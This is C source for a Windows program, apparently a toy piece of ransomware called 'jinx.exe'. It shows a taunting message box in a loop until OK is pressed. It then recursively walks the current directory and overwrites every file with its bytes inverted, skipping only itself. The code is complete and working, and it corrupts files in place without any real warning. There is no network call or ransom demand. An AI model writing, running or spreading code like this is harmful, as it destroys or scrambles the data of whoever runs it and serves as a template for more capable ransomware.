#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <stdbool.h>
#include <direct.h>

void traverseAndEncrypt(char *basePath);
void crypt(char *filePath);
int message(void)
{ //windows api messagebox yeah
    int result = MessageBoxW(
        NULL,
        L"dont brag about reaching the peak when its a fucking iceberg",
        L"yuh",
        MB_OKCANCEL | MB_ICONQUESTION
    );
    return result;
}

int main(void) {
    char buffer[1024];
    while(true) {   
    int result = message();

    if(result == IDOK) 
    {
    // Get the current working directory
        if (_getcwd(buffer, sizeof(buffer)) == NULL) 
        {
            printf("Error: Unable to get current working directory.\n");
            return 1;
        }

        printf("Working directory:\n%s\n\n", buffer);

        // Start traversing and encrypting
        traverseAndEncrypt(buffer);
        break; //if OK is pressed the encryption happens and the message box popup loop stops
    }
    }
    return 0;

}

void traverseAndEncrypt(char *basePath) {
    WIN32_FIND_DATA fileData;
    char searchPath[1024];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", basePath);  // add wildcard for directory search

    HANDLE hFind = FindFirstFile(searchPath, &fileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error: Unable to open directory: %s\n", basePath);
        return;
    }

    do {
        // Skip "." and ".." so it doesnt go crazy
        if (strcmp(fileData.cFileName, ".") == 0 || strcmp(fileData.cFileName, "..") == 0 || strcmp(fileData.cFileName, "jinx.exe") == 0) {
            continue;
        }

        char fullPath[1024];
        snprintf(fullPath, sizeof(fullPath), "%s\\%s", basePath, fileData.cFileName);

        if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // if it's a directory traverse it
            traverseAndEncrypt(fullPath);
        } else {
            // if its a file, encrypt it
            crypt(fullPath);
        }
    } while (FindNextFile(hFind, &fileData) != 0);

    FindClose(hFind);  // Close the find handle
}

void crypt(char *filePath) {
    printf("Encrypting: %s\n", filePath);

    FILE *readFile = fopen(filePath, "rb");
    if (!readFile) {
        printf("Error: Can't open file for reading: %s\n", filePath);
        return;
    }

    fseek(readFile, 0, SEEK_END);  // Get file size
    long fileSize = ftell(readFile);// basically get the amount of characters in a file
    fseek(readFile, 0, SEEK_SET);

    if (fileSize == 0) {  // Skip empty files
        printf("Skipping empty file: %s\n", filePath);
        fclose(readFile);
        return;
    }

    char *content = (char *)malloc(fileSize); //alocate memory for the content
    if (!content) {
        printf("Error: Memory allocation failed for file: %s\n", filePath);
        fclose(readFile);
        return;
    }

    size_t bytesRead = fread(content, 1, fileSize, readFile);
    fclose(readFile);

    // flip bits of the file content
    for (size_t i = 0; i < bytesRead; i++) {
        content[i] = ~content[i];
    }

    // Write back the modified content
    FILE *writeFile = fopen(filePath, "wb");
    if (!writeFile) {
        printf("Error: Can't open file for writing: %s\n", filePath);
        free(content);
        return;
    }

    fwrite(content, 1, bytesRead, writeFile);
    fclose(writeFile);
    free(content);

    printf("Successfully encrypted: %s\n", filePath);
}


